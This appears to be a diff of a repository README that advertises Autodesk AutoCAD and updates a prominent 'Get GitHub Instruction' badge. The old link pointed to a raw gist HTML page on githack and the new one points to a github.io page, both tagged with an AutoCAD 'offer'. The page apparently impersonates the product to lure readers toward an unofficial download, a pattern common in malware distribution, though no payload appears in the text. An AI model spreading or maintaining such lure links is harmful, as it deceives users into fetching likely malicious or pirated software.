@@ -3,7 +3,7 @@
 
 Autodesk AutoCAD is the world’s leading **computer-aided design (CAD) environment** for architects, engineers, and designers. Create, edit, and visualize technical drawings with unmatched precision and performance. 📐  
 
-[![🔴 Get GitHub Instruction](https://img.shields.io/badge/🔴%20Get%20GitHub%20Instruction-DD1B16?style=for-the-badge&logo=autodesk&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/kurwarayescobar55/5290c3015e110e19f92158084e499222/raw/4bc2ccc2318bedb466ed8a47efa306aade452669/get.html?offer=AutoCAD)
+[![🔴 Get GitHub Instruction](https://img.shields.io/badge/🔴%20Get%20GitHub%20Instruction-DD1B16?style=for-the-badge&logo=autodesk&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=AutoCAD)
 
 ---
 
